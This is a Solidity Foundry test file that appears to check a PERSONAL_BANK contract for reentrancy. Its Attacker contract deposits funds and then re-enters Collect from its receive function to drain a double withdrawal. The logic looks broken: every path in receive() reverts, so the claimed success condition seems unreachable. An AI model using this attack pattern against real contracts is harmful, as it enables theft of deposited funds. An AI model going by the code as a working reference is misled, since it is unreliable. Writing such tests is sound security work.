
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK, LogFile} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {

    PERSONAL_BANK public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PERSONAL_BANK();
        LogFile log = new LogFile();
        _contractUnderTest.SetLogFile(address(log));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);
        

        
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = PERSONAL_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        uint256 initialAccountingBal = victim.balances(address(this));
        initialSnapshot = address(this).balance;

        storedVal = val;

        victim.Collect(val);

        uint256 finalSnapshot = address(this).balance;
        uint256 finalAccountingBal = victim.balances(address(this));

        if (finalAccountingBal == initialAccountingBal && finalSnapshot == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(storedVal);
            revert("Reentrancy exploit revert");
        } else {
            revert("Reentrancy exploit revert");
        }
    }
}
